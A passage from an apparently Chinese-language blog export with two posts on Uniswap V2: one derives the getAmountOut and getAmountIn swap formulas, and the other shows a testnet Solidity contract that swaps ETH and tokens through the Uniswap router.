<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// @dev 获取的单个输出数额</span></span><br><span class="line"><span class="comment">// @notice 给定一项资产的输入量和配对的储备，返回另一项资产的最大输出量</span></span><br><span class="line"><span class="comment">// @param amountIn 输入数额</span></span><br><span class="line"><span class="comment">// @param reserveIn 储备量In</span></span><br><span class="line"><span class="comment">// @param reserveOut 储备量Out</span></span><br><span class="line"><span class="comment">// @return amountOut 输出数额</span></span><br><span class="line"><span class="comment">// given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getAmountOut</span>(<span class="params">uint amountIn, uint reserveIn, uint reserveOut</span>) internal pure returns (uint amountOut) &#123;</span><br><span class="line">	<span class="comment">// 确认输入数额大于0</span></span><br><span class="line">	<span class="built_in">require</span>(amountIn &gt; <span class="number">0</span>, <span class="string">&#x27;UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT&#x27;</span>);</span><br><span class="line">	<span class="comment">// 确认储备量In和储备量Out大于0</span></span><br><span class="line">	<span class="built_in">require</span>(reserveIn &gt; <span class="number">0</span> &amp;&amp; reserveOut &gt; <span class="number">0</span>, <span class="string">&#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;</span>);</span><br><span class="line">	<span class="comment">// 税后输入数额 = 输入数额 * 997</span></span><br><span class="line">	uint amountInWithFee = amountIn.<span class="title function_">mul</span>(<span class="number">997</span>);</span><br><span class="line">	<span class="comment">// 分子 = 税后输入数额 * 储备量Out</span></span><br><span class="line">	uint numerator = amountInWithFee.<span class="title function_">mul</span>(reserveOut);</span><br><span class="line">	<span class="comment">// 分母 = 储备量In * 1000 + 税后输入数额</span></span><br><span class="line">	uint denominator = reserveIn.<span class="title function_">mul</span>(<span class="number">1000</span>).<span class="title function_">add</span>(amountInWithFee);</span><br><span class="line">	<span class="comment">// 输出数额 = 分子 / 分母</span></span><br><span class="line">	amountOut = numerator / denominator;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面已知</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219141804.png" alt="20220219141804"></p>
<p>代码和公式表达方式不同，因此先将 <code>α = ∆x / x</code> 和 <code>β = ∆y / y</code> 代换回来并将上下同乘 <code>x</code>：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219142103.png" alt="20220219142103"></p>
<p>由于 <code>γ = 0.997</code>，可以将上下同乘 1000 后得到：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219142135.png" alt="20220219142135"></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219142216.png" alt="20220219142216"></p>
<p>将代码和公式结合起来：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219143438.png" alt="20220219143438"></p>
<p>getAmountOut函数，通过入参：</p>
<ul>
<li>amountIn —— ∆x —— ∆x数量的x币</li>
<li>reserveIn —— x —— x币的储备量&#x2F;池子原有的x币数量</li>
<li>reserveOut —— y —— y币的储备量</li>
</ul>
<p>计算出参:</p>
<ul>
<li>amountOut —— ∆y —— ∆y数量的y币</li>
</ul>
<p>指定的<code>∆y</code>需要多少<code>∆x</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// @dev 获取的单个输入数额</span></span><br><span class="line"><span class="comment">// @notice 给定一项资产的输出量和配对的储备，返回其他资产的所需输入量</span></span><br><span class="line"><span class="comment">// @param amountOut 输出数额</span></span><br><span class="line"><span class="comment">// @param reserveIn 储备量In</span></span><br><span class="line"><span class="comment">// @param reserveOut 储备量Out</span></span><br><span class="line"><span class="comment">// @return amountIn 输入数额</span></span><br><span class="line"><span class="comment">// given an output amount of an asset and pair reserves, returns a required input amount of the other asset</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getAmountIn</span>(<span class="params">uint amountOut, uint reserveIn, uint reserveOut</span>) internal pure returns (uint amountIn) &#123;</span><br><span class="line">	<span class="comment">// 确认输出数额大于0</span></span><br><span class="line">	<span class="built_in">require</span>(amountOut &gt; <span class="number">0</span>, <span class="string">&#x27;UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT&#x27;</span>);</span><br><span class="line">	<span class="comment">// 确认储备量In和储备量Out大于0</span></span><br><span class="line">	<span class="built_in">require</span>(reserveIn &gt; <span class="number">0</span> &amp;&amp; reserveOut &gt; <span class="number">0</span>, <span class="string">&#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;</span>);</span><br><span class="line">	<span class="comment">// 分子 = 储备量In * 储备量Out * 1000</span></span><br><span class="line">	uint numerator = reserveIn.<span class="title function_">mul</span>(amountOut).<span class="title function_">mul</span>(<span class="number">1000</span>);</span><br><span class="line">	<span class="comment">// 分母 = 储备量Out - 输出数额 * 997</span></span><br><span class="line">	uint denominator = reserveOut.<span class="title function_">sub</span>(amountOut).<span class="title function_">mul</span>(<span class="number">997</span>);</span><br><span class="line">	<span class="comment">// 输入数额 = ( 分子 / 分母 ) + 1</span></span><br><span class="line">	amountIn = (numerator / denominator).<span class="title function_">add</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一样先将 <code>α = ∆x / x</code> 、<code>β = ∆y / y</code> 和 <code>γ = 0.997</code> 代换并上下同乘 <code>1000y</code> 得到：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219152828.png" alt="20220219152828"></p>
<p>将代码和公式结合起来：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220219153330.png" alt="20220219153330"></p>
<p>getAmountIn函数，通过入参：</p>
<ul>
<li>amountOut —— ∆y —— ∆y数量的y币</li>
<li>reserveIn —— x —— x币的储备量&#x2F;池子原有的x币数量</li>
<li>reserveOut —— y —— y币的储备量</li>
</ul>
<p>计算出参:</p>
<ul>
<li>amountIn —— ∆x —— ∆x数量的x币</li>
</ul>
<p>最后有个+1，因为<code>solidity</code>在进行整数除法的时候，余数部分是会被抛弃掉的，相当于向下取整。<br>+1之后，交易者需要付出多一点点</p>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://medium.com/taipei-ethereum-meetup/uniswap-explanation-constant-product-market-maker-model-in-vyper-dff80b8467a1">Uniswap 解析：恆定乘積做市商模型 Constant Product Market Maker Model 的 Vyper 實作</a></li>
<li><a href="https://juejin.cn/post/6881428134382534663#heading-4">OneSwap系列三之 Solidity当中的算术运算</a></li>
</ul>
]]></content>
      <categories>
        <category>SmartContract</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Solidity</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
  <entry>
    <title>SmartContract-合约里调用Uniswap</title>
    <url>//50077.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>在学习闪电贷的过程中，先熟悉一下合约里调用其他swap合约的用法<br>先试一下如何在自己的合约里调用uniswap</p>
<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码:"></a>完整代码:</h1><p>kovan测试网里</p>
<ul>
<li>uniswapV2: <code>0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D</code></li>
<li>dai: <code>0x4F96Fe3b7A6Cf9725f59d353F723c1bDb64CA6Aa</code></li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity  <span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Router02.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">UseSwap</span> &#123;</span><br><span class="line">    <span class="title class_">IUniswapV</span>2Router02 private constant <span class="variable constant_">ROUTER</span> = <span class="title class_">IUniswapV</span>2Router02(<span class="number">0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D</span>); <span class="comment">//</span></span><br><span class="line">    address internal owner;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        owner = msg.<span class="property">sender</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">isOwner</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner, <span class="string">&quot;Caller is not owner&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">swapTokenToEth</span>(<span class="params">address token, uint amountOut, uint amountInMax </span>) public&#123;</span><br><span class="line">        <span class="title class_">IERC20</span>(token).<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amountInMax); <span class="comment">// 往合约里转账</span></span><br><span class="line">        <span class="title function_">_approveTokenIfNeeded</span>(token); <span class="comment">// 合约地址授权给router地址</span></span><br><span class="line">        uint deadline = block.<span class="property">timestamp</span> + <span class="number">100</span>;</span><br><span class="line">        <span class="variable constant_">ROUTER</span>.<span class="title function_">swapTokensForExactETH</span>(amountOut, amountInMax, <span class="title function_">getPathForTokenToEth</span>(token), <span class="title function_">address</span>(<span class="variable language_">this</span>), deadline);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">swapEthToToken</span>(<span class="params">address token, uint TokenOutAmountMin</span>) public payable&#123;</span><br><span class="line">        uint deadline = block.<span class="property">timestamp</span> + <span class="number">100</span>;</span><br><span class="line">        <span class="variable constant_">ROUTER</span>.<span class="property">swapExactETHForTokens</span>&#123; <span class="attr">value</span>: msg.<span class="property">value</span> &#125;(<span class="title class_">TokenOutAmountMin</span>, <span class="title function_">getPathForEthToToken</span>(token), <span class="title function_">address</span>(<span class="variable language_">this</span>), deadline);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 授权 </span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_approveTokenIfNeeded</span>(<span class="params">address token</span>) private &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">IERC20</span>(token).<span class="title function_">allowance</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), <span class="title function_">address</span>(<span class="variable constant_">ROUTER</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="title class_">IERC20</span>(token).<span class="title function_">approve</span>(<span class="title function_">address</span>(<span class="variable constant_">ROUTER</span>), <span class="number">1000000</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">approveToken</span>(<span class="params">address token</span>) public &#123;</span><br><span class="line">        <span class="title class_">IERC20</span>(token).<span class="title function_">approve</span>(<span class="title function_">address</span>(<span class="variable constant_">ROUTER</span>), <span class="number">1000000</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getPathForTokenToEth</span>(<span class="params">address token</span>) private view returns (address[] memory)&#123;</span><br><span class="line">        address[] memory path = <span class="keyword">new</span> address[](<span class="number">2</span>);</span><br><span class="line">        path[<span class="number">0</span>] = token;</span><br><span class="line">        path[<span class="number">1</span>] = <span class="variable constant_">ROUTER</span>.<span class="title function_">WETH</span>();</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getPathForEthToToken</span>(<span class="params">address token</span>) private view returns (address[] memory)&#123;</span><br><span class="line">        address[] memory path = <span class="keyword">new</span> address[](<span class="number">2</span>);</span><br><span class="line">        path[<span class="number">0</span>] = <span class="variable constant_">ROUTER</span>.<span class="title function_">WETH</span>();</span><br><span class="line">        path[<span class="number">1</span>] = token;</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">address payable _address, uint withdrawAmount</span>) public payable isOwner&#123;</span><br><span class="line">        _address.<span class="title function_">transfer</span>(withdrawAmount);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// important to receive ETH</span></span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="实例化合约"><a href="#实例化合约" class="headerlink" title="实例化合约:"></a>实例化合约:</h1><p>知道合约的interface和合约地址后，就可以实例化合约了。</p>
<h1 id="Eth-gt-Token"><a href="#Eth-gt-Token" class="headerlink" title="Eth -&gt; Token:"></a>Eth -&gt; Token:</h1><h2 id="定义receive函数"><a href="#定义receive函数" class="headerlink" title="定义receive函数:"></a>定义receive函数:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">receive 接收以太函数</span><br><span class="line">一个合约最多有一个 receive 函数, 声明函数为： receive() external payable &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">不需要 function 关键字，也没有参数和返回值并且必须是　external　可见性和　payable 修饰． 它可以是 virtual 的，可以被重载也可以有 修改器modifier 。</span><br></pre></td></tr></table></figure>

<p>合约里要定义receive函数才能接受eth</p>
<h2 id="swapExactETHForTokens"><a href="#swapExactETHForTokens" class="headerlink" title="swapExactETHForTokens:"></a>swapExactETHForTokens:</h2><p>要用到<code>uniswapRouter</code>的<code>swapExactETHForTokens</code>函数:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">swapExactETHForTokens</span>(<span class="params">uint amountOutMin, address[] calldata path, address to, uint deadline</span>)</span><br><span class="line">    external</span><br><span class="line">    virtual</span><br><span class="line">    override</span><br><span class="line">    payable</span><br><span class="line">    <span class="title function_">ensure</span>(deadline)</span><br><span class="line">    returns (uint[] memory amounts)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">require</span>(path[<span class="number">0</span>] == <span class="variable constant_">WETH</span>, <span class="string">&#x27;UniswapV2Router: INVALID_PATH&#x27;</span>);</span><br><span class="line">    amounts = <span class="title class_">UniswapV2Library</span>.<span class="title function_">getAmountsOut</span>(factory, msg.<span class="property">value</span>, path); <span class="comment">// 获得可兑换出来的数量</span></span><br><span class="line">    <span class="built_in">require</span>(amounts[amounts.<span class="property">length</span> - <span class="number">1</span>] &gt;= amountOutMin, <span class="string">&#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;</span>); <span class="comment">// 可兑换的数量要大于我们的期望值</span></span><br><span class="line">    <span class="title function_">IWETH</span>(<span class="variable constant_">WETH</span>).<span class="property">deposit</span>&#123;<span class="attr">value</span>: amounts[<span class="number">0</span>]&#125;();</span><br><span class="line">    <span class="title function_">assert</span>(<span class="title function_">IWETH</span>(<span class="variable constant_">WETH</span>).<span class="title function_">transfer</span>(<span class="title class_">UniswapV2Library</span>.<span class="title function_">pairFor</span>(factory, path[<span class="number">0</span>], path[<span class="number">1</span>]), amounts[<span class="number">0</span>]));</span><br><span class="line">    <span class="title function_">_swap</span>(amounts, path, to); <span class="comment">// swap</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数有<code>payable</code>修饰，需要输入eth的数量通过<code>msg.value</code>传入</p>
<p>通过在自己合约里调用<code>swapExactETHForTokens</code>函数的流程是:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">swapEthToToken</span>(<span class="params">address token, uint TokenOutAmountMin</span>) public payable&#123;</span><br><span class="line">    uint deadline = block.<span class="property">timestamp</span> + <span class="number">100</span>;</span><br><span class="line">    <span class="variable constant_">ROUTER</span>.<span class="property">swapExactETHForTokens</span>&#123; <span class="attr">value</span>: msg.<span class="property">value</span> &#125;(<span class="title class_">TokenOutAmountMin</span>, <span class="title function_">getPathForEthToToken</span>(token), <span class="title function_">address</span>(<span class="variable language_">this</span>), deadline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>函数为payable</li>
<li>调用函数的同时转账<code>msg.value</code>数量的eth</li>
<li>eth继续通过<code>msg.value</code>传入，调用<code>swapExactETHForTokens</code></li>
</ol>
<h1 id="Token-gt-Eth"><a href="#Token-gt-Eth" class="headerlink" title="Token -&gt; Eth:"></a>Token -&gt; Eth:</h1><p>这里要用到<code>uniswapRouter</code>的<code>swapTokensForExactETH</code>函数，<br>一开始遇到<code>Fail with error &#39;TransferHelper: ETH_TRANSFER_FAILED&#39;</code>报错<br>看了一下函数的定义</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">swapTokensForExactETH</span>(<span class="params">uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline</span>)</span><br><span class="line">    external</span><br><span class="line">    virtual</span><br><span class="line">    override</span><br><span class="line">    <span class="title function_">ensure</span>(deadline)</span><br><span class="line">    returns (uint[] memory amounts)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">require</span>(path[path.<span class="property">length</span> - <span class="number">1</span>] == <span class="variable constant_">WETH</span>, <span class="string">&#x27;UniswapV2Router: INVALID_PATH&#x27;</span>);</span><br><span class="line">    amounts = <span class="title class_">UniswapV2Library</span>.<span class="title function_">getAmountsIn</span>(factory, amountOut, path);</span><br><span class="line">    <span class="built_in">require</span>(amounts[<span class="number">0</span>] &lt;= amountInMax, <span class="string">&#x27;UniswapV2Router: EXCESSIVE_INPUT_AMOUNT&#x27;</span>);</span><br><span class="line">    <span class="title class_">TransferHelper</span>.<span class="title function_">safeTransferFrom</span>(</span><br><span class="line">        path[<span class="number">0</span>], msg.<span class="property">sender</span>, <span class="title class_">UniswapV2Library</span>.<span class="title function_">pairFor</span>(factory, path[<span class="number">0</span>], path[<span class="number">1</span>]), amounts[<span class="number">0</span>]</span><br><span class="line">    );  <span class="comment">// Here</span></span><br><span class="line">    <span class="title function_">_swap</span>(amounts, path, <span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">    <span class="title function_">IWETH</span>(<span class="variable constant_">WETH</span>).<span class="title function_">withdraw</span>(amounts[amounts.<span class="property">length</span> - <span class="number">1</span>]);</span><br><span class="line">    <span class="title class_">TransferHelper</span>.<span class="title function_">safeTransferETH</span>(to, amounts[amounts.<span class="property">length</span> - <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有payable修饰，在兑换成ETH之前，需要把token转进去</p>
<p>通过在自己合约里调用<code>swapTokensForExactETH</code>函数的流程是:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">swapTokenToEth</span>(<span class="params">address token, uint amountOut, uint amountInMax </span>) public&#123;</span><br><span class="line">    <span class="title class_">IERC20</span>(token).<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amountInMax); <span class="comment">// 往合约里转账</span></span><br><span class="line">    <span class="title function_">_approveTokenIfNeeded</span>(token);</span><br><span class="line">    uint deadline = block.<span class="property">timestamp</span> + <span class="number">100</span>;</span><br><span class="line">    <span class="variable constant_">ROUTER</span>.<span class="title function_">swapTokensForExactETH</span>(amountOut, amountInMax, <span class="title function_">getPathForTokenToEth</span>(token), <span class="title function_">address</span>(<span class="variable language_">this</span>), deadline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<ol>
<li>自己的钱包地址授权<code>Dai</code>额度给自己的合约地址</li>
<li>合约从钱包里提取一定额度<code>Dai</code></li>
<li>合约授权<code>Dai</code>给uniswap router</li>
<li>uniswap router从合约里提取<code>Dai</code>，兑换成eth，再发回来</li>
</ol>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://github.com/PancakeBunny-finance/Bunny/blob/main/contracts/zap/ZapBSC.sol">https://github.com/PancakeBunny-finance/Bunny/blob/main/contracts/zap/ZapBSC.sol</a></li>
<li><a href="https://learnblockchain.cn/question/1828">使用智能合约调用Uniswap交换token时出现错误</a></li>
<li><a href="https://soliditydeveloper.com/uniswap2">Using the new Uniswap v2 in your contracts</a></li>
<li><a href="https://learnblockchain.cn/docs/solidity/contracts.html#receive">receive函数</a></li>
<li><a href="https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol">https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol</a></li>
</ul>
]]></content>
      <categories>
        <category>SmartContract</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Solidity</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
</search>
